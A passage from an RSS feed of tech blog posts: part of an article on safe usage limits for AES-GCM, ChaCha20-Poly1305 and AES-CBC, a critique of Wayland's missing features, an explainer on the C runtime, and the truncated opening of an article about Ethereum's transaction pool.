<p>Since the block size of AES is 16 bytes, this means the maximum length of a single AES-GCM (key, nonce) pair is <img src="https://s0.wp.com/latex.php?latex=2%5E%7B36%7D+-+256&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{36} - 256" title="2^{36} - 256"> <strong>bytes</strong> (or 68,719,476,480 bytes). This is approximately 68 GB or 64 GiB.</p>



<p>Things get a bit tricker to analyze when the nonce is not 96 bits, since it’s hashed.</p>



<p>The disadvantage of this hashing behavior is that it’s possible for two different nonces to produce overlapping ranges of AES-CTR output, which makes the security analysis very difficult.</p>



<p>However, this hashed output is also hidden from network observers since they do not know the value of H. Without some method of reliably detecting when you have an overlapping range of hidden block counters, you can’t exploit this.</p>



<p>(If you want to live dangerously and motivate cryptanalysis research, mix 96-bit and non-96-bit nonces with the same key in a system that does something valuable.)</p>



<h4>Multi-Message AES-GCM Key Wear-Out</h4>



<p>Now that we’ve established the maximum length for a single message,  how many messages you can safely encrypt under a given AES-GCM key depends entirely on how your nonce is selected.</p>



<p>If you have a reliable counter, which is guaranteed to never repeat, and start it at 0 you can theoretically encrypt <img src="https://s0.wp.com/latex.php?latex=2%5E%7B96%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{96}" title="2^{96}"> messages safely. Hooray!</p>







<p>You probably don’t have a reliable counter, especially in real-world settings (distributed systems, multi-threaded applications, virtual machines that might be snapshotted and restored, etc.).</p>



<div><figure><img data-attachment-id="130" data-permalink="https://soatok.blog/computeranger/" data-orig-file="https://soatok.files.wordpress.com/2020/04/computeranger.png" data-orig-size="224,224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="This is outrageous!" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/04/computeranger.png?w=224" data-large-file="https://soatok.files.wordpress.com/2020/04/computeranger.png?w=224" src="https://soatok.files.wordpress.com/2020/04/computeranger.png?w=224" alt="Soatok angrily grasping computer monitor" srcset="https://soatok.files.wordpress.com/2020/04/computeranger.png 224w, https://soatok.files.wordpress.com/2020/04/computeranger.png?w=150 150w" sizes="(max-width: 224px) 100vw, 224px"><figcaption>Confound you, technical limitations!<br>(Art by <a href="https://twitter.com/Swizzlestixick">Swizz</a>)</figcaption></figure></div>



<p>Additionally (thanks to <a href="https://twitter.com/2adic">2adic</a> for the expedient correction), you cannot safely encrypt more than <img src="https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{64}" title="2^{64}"> blocks with AES because the keystream blocks–as the output of a block cipher–cannot repeat.</p>



<p>Most systems that cannot guarantee unique incrementing nonces simply generate nonces with a cryptographically secure random number generator. This is a good idea, but no matter how high quality your random number generator is, random functions will produce collisions with a discrete probability.</p>



<p>If you have <img src="https://s0.wp.com/latex.php?latex=2%5En&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^n" title="2^n"> possible values, you should expect a single collision(with 50% probability) after <img src="https://s0.wp.com/latex.php?latex=%5Csqrt%7B2%5E%7Bn%7D%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="\sqrt{2^{n}}" title="\sqrt{2^{n}}"> (or <img src="https://s0.wp.com/latex.php?latex=2%5E%7Bn%2F2%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{n/2}" title="2^{n/2}">)samples. This is called the <strong>birthday bound</strong>.</p>



<p>However, 50% of a nonce reuse isn’t exactly a comfortable safety threshold for most systems (especially since nonce reuse will cause AES-GCM to become vulnerable to active attackers). 1 in 4 billion is a much more comfortable safety margin against nonce reuse via collisions than 1 in 2. Fortunately, you can <a href="https://en.wikipedia.org/wiki/Birthday_problem">calculate the discrete probability of a birthday collision</a> pretty easily.</p>



<p>If you want to rekey after your collision probability exceeds <img src="https://s0.wp.com/latex.php?latex=2%5E%7B-32%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{-32}" title="2^{-32}"> (for a random nonce between 0 and <img src="https://s0.wp.com/latex.php?latex=2%5E%7B96%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{96}" title="2^{96}">), you simply need to re-key after <img src="https://s0.wp.com/latex.php?latex=2%5E%7B32%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{32}" title="2^{32}"> messages.</p>



<h4>AES-GCM Safety Limits</h4>







<div><figure><img data-attachment-id="1388" data-permalink="https://soatok.blog/soatoktelegrams2020-12/" data-orig-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-12" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=512" src="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=512" alt="" srcset="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png 512w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=150 150w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>Not bad, but we can do better.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<h3 id="chacha20poly1305-limits">Cryptographic Limits for ChaCha20-Poly1305</h3>



<p>The IETF version of ChaCha20-Poly1305 uses 96-bit nonces and 32-bit internal counters. A similar analysis follows from AES-GCM’s, with a few notable exceptions.</p>



<p>For starters, the one-time Poly1305 key is derived from the first 32 bytes of the ChaCha20 keystream output (block 0) for a given (nonce, key) pair. There is no equivalent to AES-GCM’s H parameter which is static for each key. (The ChaCha20 encryption begins using block 1.)</p>



<p>Additionally, each block for ChaCha20 is 512 bits, unlike AES’s 128 bits. So the message limit here is a little more forgiving.</p>



<p>Since the block size is 512 bits (or 64 bytes), and only one block is consumed for Poly1305 key derivation, we can calculate a message length limit of <img src="https://s0.wp.com/latex.php?latex=2%5E%7B38%7D+-+64&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{38} - 64" title="2^{38} - 64">, or 274,877,906,880 bytes–nearly 256 GiB for each (nonce, key) pair.</p>



<p>The same rules for handling 96-bit nonces applies as with AES-GCM, so we can carry that value forward.</p>



<h4>ChaCha20-Poly1305 Safety Limits</h4>







<div><figure><img data-attachment-id="120" data-permalink="https://soatok.blog/soatok_stickerpack-smile/" data-orig-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Soatok" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png?w=512" src="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png?w=512" alt="Soatok" srcset="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png 512w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png?w=150 150w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-smile.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>A significant improvement, but still practically limited.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<h3 id="chacha20poly1305-limits">Cryptographic Limits for XChaCha20-Poly1305</h3>



<p>XChaCha20-Poly1305 is a variant of XSalsa20-Poly1305 (as used in libsodium) and the IETF’s ChaCha20-Poly1305 construction. It features 192-bit nonces and 32-bit internal counters.</p>



<p>XChaCha20-Poly1305 is instantiated by using HChaCha20 of the key over the first 128 bits of the nonce to produce a subkey, which is used with the remaining nonce bits using the aforementioned ChaCha20-Poly1305.</p>



<p>This doesn’t change the maximum message length, but it <em>does</em> change the number of messages you can safely encrypt (since you’re actually using up to <img src="https://s0.wp.com/latex.php?latex=2%5E%7B128%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{128}" title="2^{128}"> distinct keys).</p>



<p>Thus, even if you manage to repeat the final ChaCha20-Poly1305 nonce, as long as the total nonce differs, each encryptions will be performed with a distinct key (thanks to the HChaCha20 key derivation; see the <a href="https://cr.yp.to/snuffle/xsalsa-20110204.pdf">XSalsa20 paper</a> and <a href="https://tools.ietf.org/html/draft-irtf-cfrg-xchacha-03">IETF RFC draft</a> for details).</p>



<h4>XChaCha20-Poly1305 Safety Limits</h4>







<div><figure><img loading="lazy" data-attachment-id="1201" data-permalink="https://soatok.blog/soatoktelegrams2020-01/" data-orig-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-01" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png?w=512" src="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png?w=512" alt="Galaxy Brain meme, but a furry" width="512" height="512" srcset="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png 512w, https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png?w=150 150w, https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-01.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>I can <s>see</s> encrypt forever, man.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<h3>Cryptographic Limits for AES-CBC</h3>



<p>It’s tempting to compare non-AEAD constructions and block cipher modes such as CBC (Cipher Block Chaining), but they’re totally different monsters.</p>



<ul><li>AEAD ciphers have a clean delineation between message length limit and the message quantity limit</li><li>CBC and other cipher modes do not have this separation</li></ul>



<p>Every time you encrypt a block with AES-CBC, you are depleting from a <strong>universal</strong> bucket that affects the birthday bound security of encrypting more messages under that key. (And unlike AES-GCM with long nonces, AES-CBC’s IV is public.)</p>



<p>This is in addition to the operational requirements of AES-CBC (plaintext padding, initialization vectors that never repeat <em>and</em> must be unpredictable, separate message authentication since CBC doesn’t provide integrity and is vulnerable to chosen-ciphertext atacks, etc.).</p>



<div><figure><img data-attachment-id="1210" data-permalink="https://soatok.blog/soatok_stickerpack_ind_cca2/" data-orig-file="https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Soatok_STICKERPACK_IND_CCA2" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png?w=512" src="https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png?w=512" alt="This isn't IND-CCA2 Secure!" srcset="https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png 512w, https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png?w=150 150w, https://soatok.files.wordpress.com/2020/08/soatok_stickerpack_ind_cca2.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>My canned response to most queries about AES-CBC.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<p>For this reason, most cryptographers don’t even bother calculating the safety limit for AES-CBC in the same breath as discussing AES-GCM. And they’re right to do so!</p>



<p>If you find yourself using AES-CBC (or AES-CTR, for that matter), you’d best be performing a separate HMAC-SHA256 over the ciphertext (and verifying this HMAC with <a href="https://soatok.blog/2020/08/27/soatoks-guide-to-side-channel-attacks/#string-comparison">a secure comparison function</a> before decrypting). Additionally, you should consider using <a href="https://github.com/defuse/php-encryption/blob/master/docs/CryptoDetails.md">an extended nonce construction to split one-time encryption and authentication keys</a>.</p>







<p>However, for the sake of completeness, let’s figure out what our practical limits are.</p>



<p>CBC operates on entire blocks of plaintext, whether you need the entire block or not.</p>



<p>On encryption, the output of the previous block is mixed (using XOR) with the current block, then encrypted with the block cipher. For the first block, the IV is used in the place of a “previous” block. (Hence, its requirements to be non-repeating <em>and</em> unpredictable.)</p>



<p>This means you can informally model (IV xor PlaintextBlock) and (PB<sub>n</sub> xor PB<sub>n+1</sub>) as a pseudo-random function, before it’s encrypted with the block cipher.</p>



<p>If those words don’t mean anything to you, here’s the kicker: You can use the above discussion about birthday bounds to calculate the upper safety bounds for the <strong>total</strong> number of blocks encrypted under a single AES key (assuming IVs are generated from a secure random source).</p>



<p>If you’re okay with a 50% probability of a collision, you should re-key after <img src="https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{64}" title="2^{64}"> blocks have been encrypted.</p>



<figure><p><span><iframe width="580" height="327" src="https://www.youtube.com/embed/v0IsYNDMV7A?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p><figcaption>This video …</figcaption></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://soatok.blog/2020/12/24/cryptographic-wear-out-for-symmetric-encryption/">https://soatok.blog/2020/12/24/cryptographic-wear-out-for-symmetric-encryption/</a></em></p>]]>
            </description>
            <link>https://soatok.blog/2020/12/24/cryptographic-wear-out-for-symmetric-encryption/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525450</guid>
            <pubDate>Thu, 24 Dec 2020 06:24:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things Wrong with Wayland]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25525367">thread link</a>) | @kirbykevinson
<br/>
December 23, 2020 | https://kirby.kevinson.org/blog/things-wrong-with-wayland/ | <a href="https://web.archive.org/web/*/https://kirby.kevinson.org/blog/things-wrong-with-wayland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

				
				
	<p>I, as a person who tries to use cutting edge technology, am a Wayland
user, and ever since I started using it, I haven’t been able to get
the thoughts about its problems out of my head. It’s time to get this
thing off my chest. Here are the reasons Wayland is still not here:</p>
<h2 id="the-main-problem">The main problem</h2>
<p>You may think that it’s the fact that it was decided to move from the
“there’s only 1 display server” idea. You’re wrong, as that would
invalidate the <a href="https://wayland.freedesktop.org/">core goals</a> of the project - to be just a protocol
that requires implementations.</p>
<p>What can’t be denied, however, is the fact that instead of creating a
full-featured “batteries included” set of protocols and a reference
implementation of a library, compositors based on which could compete
with X by being just as feature complete, there was created only a
<a href="https://gitlab.freedesktop.org/wayland/weston" title="weston">simple compositor</a>, which can only satisfy the needs of a kiosk and
not a modern desktop environment. An unofficial version of <a href="https://github.com/swaywm/wlroots/" title="wlroots">such a
library</a> didn’t even appear until 2017.</p>
<h2 id="the-consequences-it-has">The consequences it has</h2>
<h3 id="feature-incompleteness">Feature incompleteness</h3>
<p>After 12 years of development, the implementations of the protocol
still have a series of features incompletely implemented:</p>
<ul>
<li>Color management -
<a href="https://gitlab.freedesktop.org/wayland/wayland-protocols/-/merge_requests/14">1</a>,
<a href="https://github.com/swaywm/wlroots/pull/2353">2</a>,
<a href="https://gitlab.gnome.org/GNOME/mutter/-/issues/1360">3</a>,
<a href="https://invent.kde.org/plasma/kwin/-/issues/11">4</a></li>
<li>Variable refresh rate support -
<a href="https://gitlab.freedesktop.org/wayland/wayland/-/issues/84">1</a>,
<a href="https://gitlab.gnome.org/GNOME/mutter/-/merge_requests/1154">2</a>,
<a href="https://bugs.kde.org/show_bug.cgi?id=405912">3</a></li>
<li>High bit depth display support -
<a href="https://github.com/swaywm/wlroots/issues/1378">1</a>,
<a href="https://gitlab.gnome.org/GNOME/mutter/-/issues/1391">2</a></li>
<li>DRM leasing -
<a href="https://gitlab.freedesktop.org/wayland/wayland-protocols/-/merge_requests/49">1</a>,
<a href="https://github.com/swaywm/wlroots/issues/1723">2</a></li>
<li><a href="https://github.com/obsproject/rfcs/pull/14">Screencasting</a></li>
<li><a href="https://community.teamviewer.com/English/discussion/26340/state-of-wayland-teamviewer">Remote desktop</a></li>
<li><a href="https://github.com/ReimuNotMoe/ydotool">Input simulation and window control</a></li>
<li>Client-side global hotkey binding</li>
<li>Nvidia GPU support - yes it is indeed Nvidia’s fault, but to the
end user it makes no difference</li>
</ul>
<p>As you can see, it’s not so many, and the partial fault here is on
clients rather than servers.</p>
<h3 id="implementation-difficulty">Implementation difficulty</h3>
<p>On the server side, while it’s true that Wayland makes implementing a
display server much easier, implementing a window manager is still a
nightmare. For example, even using a library, you need to write <a href="https://github.com/swaywm/wlroots/tree/master/tinywl" title="tinywl">a
thousand lines of code</a> to implement the absolute bare bones
compositor, which won’t even support such critical things as damage
tracking, hi-DPI, graphical tablets, multiseat, and any input/output
configuration. X, on the other hand, allows you to write as few as <a href="http://incise.org/tinywm.html" title="tinywm">50
lines of code</a> because it handles most of things such as the ones
listed itself.</p>
<h3 id="lack-of-standardization">Lack of standardization</h3>
<p>Wayland’s <a href="https://gitlab.freedesktop.org/wayland/wayland-protocols/">core set of protocols</a> while covering a wide range things,
doesn’t provide ones needed to build a modern desktop environment such
as a desktop shell protocol (to build such things as panels and
launchers), a protocol to simulate input and control windows, a
protocol to control the clipboard, and others, leaving that to the
compositors. While <a href="https://github.com/swaywm/wlr-protocols/" title="wlr-protocols">such a set of protocols</a> does exist, it’s not
adopted by the majority of the compositors. A similar problem is
happening to <a href="https://github.com/flatpak/xdg-desktop-portal" title="xdg-desktop-portal">the set of protocols</a> required to screenshot, screencast
and remote desktop - the adoption by clients is extremely low. This
makes working with Wayland and debugging it much less flexible and
compositor-dependable than X, and makes developing clients even
harder.</p>
<h3 id="lack-of-configurability">Lack of configurability</h3>
<p>In contrast to X.org, which has <a href="https://linux.die.net/man/5/xorg.conf">a unified config system</a>, each
Wayland compositor has to implement configuration separately. This
results in not only inconvenience when trying to move the config from
one compositor to another or describing how to configure something,
but also different feature coverage by different compositors. For
example, a compositor may not implement an input configuration such as
scrolling speed or graphical tablet mapping or an output configuration
such as display bit depth. <a href="https://github.com/Hjdskes/cage/issues/138">In some cases</a> the compositor may not even
implement any input configuration, which makes using it extremely
problematic, especially considering such a problem doesn’t exist when
using X.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Considering the listed problems, the Wayland’s future doesn’t look
that bright. But don’t give up hope just yet, as long as we have
projects like wlroots pushing the innovation, not everything is lost!</p>


			</div></div>]]>
            </description>
            <link>https://kirby.kevinson.org/blog/things-wrong-with-wayland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525367</guid>
            <pubDate>Thu, 24 Dec 2020 05:55:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does C Have a Runtime?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524989">thread link</a>) | @desi_ninja
<br/>
December 23, 2020 | https://pratikone.github.io/c/2020/06/07/does-C-have-a-runtime.html | <a href="https://web.archive.org/web/*/https://pratikone.github.io/c/2020/06/07/does-C-have-a-runtime.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>07 Jun 2020</span></p><p><img src="https://pratikone.github.io/public/images/speech_bubble1.png" alt="bubble" title="Image source : https://pixabay.com/illustrations/speech-bubble-thinking-talk-5775045/" height="auto" width="30%"></p>

<p>Java has a runtime. We have seen countless times to install or update JRE - Java Runtime environment. Python too has runtime. It is provided by the python executable. But what about C ? Does it have a runtime ? I have never come across a C runtime installer. How about C++ ?<br>
The short answer is <strong>YES</strong>. <br>
C has a runtime, albeit a tiny one and C++ also has a runtime. We don’t notice it because it is usually provided by the OS itself and with every new OS update, it gets updated. There is a small exception with that (VC runtime library on Windows) but we will talk about it later. Let’s get to the basics.</p>

<h2 id="what-is-c-runtime-crt-">What is C runtime (CRT) ?</h2>
<p>Whenever we refer to C runtime, we usually mean one or both of these things:</p>
<ol>
  <li><em>Bootstrap and Runtime environment</em>  : It sets up the necessary bootstrapping code which tells the OS how to run this binary code, followed by code for setting up the runtime environment for executing user code. It is included as inline assembly in the compiled binary itself.</li>
  <li><em>Runtime library</em> : it contains functions to interact with the OS; functions to allocate memory, read and write to files, network etc.</li>
</ol>

<h3 id="bootstrap-and-c-runtime-environment">Bootstrap and C runtime environment</h3>
<p>As the name suggests, this is the code which sets up the execution point for the program for the OS to call. It defines the structure of functions, setup call stack and its calling convention (_stdcall, __cdecl ). This is the most important and necessary code to run our program in the OS.  It is specific to the OS version and doesn’t usually change but gets updated by the OS itself during its update. Among those dozens of Windows update we receive regularly, some of them update the CRT too.</p>

<p><img src="https://www.howtogeek.com/wp-content/uploads/2018/06/img_5b2d86d471d92.png" alt="winupdate" title="Please wait while Windows is updating ..." height="auto" width="50%"></p>

<p><a href="https://en.wikipedia.org/wiki/Crt0"><code>crt0</code></a> is a special file which gets linked to every program during the linking phase of compilation. It has basic program loading routines which instruct the compiler on how to call this program’s <code>main()</code> function and even exit the running program. Like everything else in the C and C++ ecosystem, there is a flexibility of choice on including it. If one wants to write his/her own startup code, they can avoid linking to crt0 altogether (<a href="https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html">nostartfiles</a> in GCC) and just provide their code in <code>_start</code> label in assembly (<a href="https://stackoverflow.com/questions/29694564/what-is-the-use-of-start-in-c"><code>_start</code> calls <code>main()</code> of user code</a>). 
In case of C++, <code>crt1</code> can be linked alternatively,  which provides some extra functionality for constructor and destructors.</p>

<h3 id="c-runtime-library">C runtime library</h3>
<p>The runtime library or standard library (<code>stdlib</code>) contains a series of useful functions like <code>malloc</code>, <code>free</code>, <code>printf</code>, <code>memcpy</code> (<a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/crt-alphabetical-function-reference?view=msvc-160">MSVC</a>, <a href="https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html#Other-Builtins">GCC</a> ) for interacting with the OS which almost every program needs. This part can be statically or dynamically linked. Windows provides libcmt.lib for C and libcpmt.lib for C++. 
If one chooses to link it statically, only the code called by the user’s program gets added to its binary, increasing the size. Removing stdlib can significantly reduce the binary size, which could be as significant as 90% in tiny programs. If one has to create the C code binary with smallest size, this would be the key step in reducing binary size to ~ 1 kb.</p>

<p>If one dynamically links to CRT, this size bump is not there (it is standard for programs to dynamically link to this library for multiple reasons like compatibility with other dll, apart from small size saving). Every OS provides an implementation. <code>UCRT.dll</code> on Windows and <code>libc.so</code> (GLibc) on Linux.</p>

<blockquote>
  <p>Normal dynamic loading of dll rule applies : If the program loads two different versions of CRT dll, they won’t share global variables. Not taking care of this fact could cause very subtle bugs in multi-dll codebases,  in calling runtime functions which maintain any state.</p>
</blockquote>

<p>A user code cannot be faster than its runtime library’s performance.
Runtime libraries keep getting improvements through updates and one can receive those fixes as part of VC++Runtime updates on Windows or libc updates on Linux. Programs compiled with a specific CRT lib may expect that specific or compatible CRT dll. Thus, it is possible to keep side by side copies of different versions of CRT dlls (<a href="https://en.wikipedia.org/wiki/DLL_Hell">DLL hell ?</a>).</p>

<h2 id="all-you-need-is-c">All you need is C</h2>
<p>C runtime is an interesting piece of software - it depends not only on OS and architecture but also on compiler. To give an example, runtime code generated on 64 bit windows by GCC would be different from that generated by MSVC. 
If you want to port C to a brand new OS,  all you need apart from the compiler is a working C runtime and that’s it, C gets ported.</p>

<p>Thanks for reading this far. For the last couple of months, I have been interested in inner workings of C and C++ ecosystem. This is an article in that direction. Tweet any suggestions or corrections to me at <a href="https://twitter.com/pratikone">@pratikone</a></p>

<h2 id="references">References</h2>
<p><a href="https://stackoverflow.com/questions/2709998/crt0-o-and-crt1-o-whats-the-difference">https://stackoverflow.com/questions/2709998/crt0-o-and-crt1-o-whats-the-difference</a></p>

<p><a href="http://www.vishalchovatiya.com/crt-run-time-before-starting-main">http://www.vishalchovatiya.com/crt-run-time-before-starting-main</a></p>

<p><a href="https://blogs.oracle.com/linux/hello-from-a-libc-free-world-part-1-v2">https://blogs.oracle.com/linux/hello-from-a-libc-free-world-part-1-v2</a></p>

<p><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/c-run-time-library-reference?view=msvc-160">https://docs.microsoft.com/en-us/cpp/c-runtime-library/c-run-time-library-reference?view=msvc-160</a></p>

<p><a href="https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html#Other-Builtins">https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html#Other-Builtins</a></p>

</div>





    </div></div>]]>
            </description>
            <link>https://pratikone.github.io/c/2020/06/07/does-C-have-a-runtime.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524989</guid>
            <pubDate>Thu, 24 Dec 2020 04:10:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring the methods of looking into Ethereum’s transaction pool]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524749">thread link</a>) | @toxzic
<br/>
December 23, 2020 | https://chainstack.com/exploring-the-methods-of-looking-into-ethereums-transaction-pool/ | <a href="https://web.archive.org/web/*/https://chainstack.com/exploring-the-methods-of-looking-into-ethereums-transaction-pool/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img loading="lazy" width="1024" height="542" src="https://chainstack.com/wp-content/uploads/2020/12/image-1-1024x542.png" alt="" srcset="https://chainstack.com/wp-content/uploads/2020/12/image-1-1024x542.png 1024w, https://chainstack.com/wp-content/uploads/2020/12/image-1-300x159.png 300w, https://chainstack.com/wp-content/uploads/2020/12/image-1-768x407.png 768w, https://chainstack.com/wp-content/uploads/2020/12/image-1-1536x814.png 1536w, https://chainstack.com/wp-content/uploads/2020/12/image-1-530x281.png 530w, https://chainstack.com/wp-content/uploads/2020/12/image-1-330x175.png 330w, https://chainstack.com/wp-content/uploads/2020/12/image-1.png 1701w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><h2>Introduction</h2><p>The mempool of the Ethereum mainnetâ€”called transaction pool or txpoolâ€”is the dynamic in-memory area where pending transactions reside before they are included in a block and thus become static.</p><p>The notion of a global txpool is a bit abstract as there is no single defined pool for all pending transactions. Instead, each node on the Ethereum mainnet has its own pool of transactions and, combined, they all form the global pool.</p><p>The thousands of pending transactions that enter the global pool by being broadcast on the network and before being included in a block are an always changing data set that’s holding millions of dollars at any given second.</p><p>There’s a lot that one can do hereâ€”and many do and make this txpool business a highly competitive market.</p><p>A few examples, listed in the order of inconspicuous to contentious:</p><ul><li>Yield farming â€” you can watch the transactions movement between DeFi applications to be one of the first to detect the yield farming profitability changes.</li><li>Liquidity providing â€” you detect the potential liquidity movements in and out of DeFi applications and act on the changes.</li><li>Arbitrage â€” you can detect the movement of transactions that will affect token prices at different DEXes and make your 